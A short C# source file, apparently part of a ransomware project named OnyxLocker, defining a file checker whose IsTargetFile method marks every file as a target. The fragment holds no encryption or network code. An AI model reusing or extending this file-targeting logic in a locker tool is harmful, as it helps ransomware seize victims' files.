namespace OnyxLocker
{
    internal class FileChecker : IFileChecker
    {
        public string[] TargetFiles { get; }

        public bool IsTargetFile(string filePath)
        {
            return true;
        }
    }
}